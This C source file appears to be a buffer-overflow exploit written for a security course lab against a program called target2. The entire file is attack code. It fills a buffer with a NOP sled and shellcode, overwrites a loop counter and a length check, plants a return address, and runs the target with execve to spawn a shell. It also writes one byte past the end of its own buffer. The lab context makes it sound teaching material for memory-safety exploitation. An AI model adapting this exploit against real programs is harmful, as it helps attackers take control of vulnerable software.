#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

static const int addr = 0x2021fd40;	// buf's starting address in target2.c
static const int NOP = 0x90;

// set this at 264 / 4 , upper bytes dont matter, skipped over in for loop
static const int replacei = 0x9090900B;

// set this at 268 / 4 
static const int replacelen = 0x0000011B;

// len after length check in foo will be 268 + 1 + terminator = 270 bytes
// replacelen is 283, change if RA isnt within the range
// Return address at 280-283
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[3];

	char buf[284];
	memset((void *)buf, NOP, 280);

	int i, j;
	int *long_ptr = (int *)buf;
	
	// Set replacement for iterator value i
	for (i = 66; i < 67; i++) *(long_ptr + i) = (int)replacei;
	
	// Set replacement for bounds checker len
	for (i = 67; i < 68; i++) *(long_ptr + i) = (int)replacelen;
	
	// addr only needed till i = 71, but replacelen keeps in bounds	anyways
	for (i = 68; i < 71; i++) *(long_ptr + i) = (int)addr; 
	
	// Place shellcode after 8 NOPs (works so far)	
	for (j = 8; j < (8 + strlen(shellcode)); j++) buf[j] = shellcode[j-8];
	
	buf[284] = '\0';	// terminate string with NULL

	args[0] = TARGET;
	args[1] = (char *)buf;
	args[2] = NULL;
	
	env[0] = (char *)(buf+271);	// One more NULL to allign memory
	env[1] = (char *)(buf+272);
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
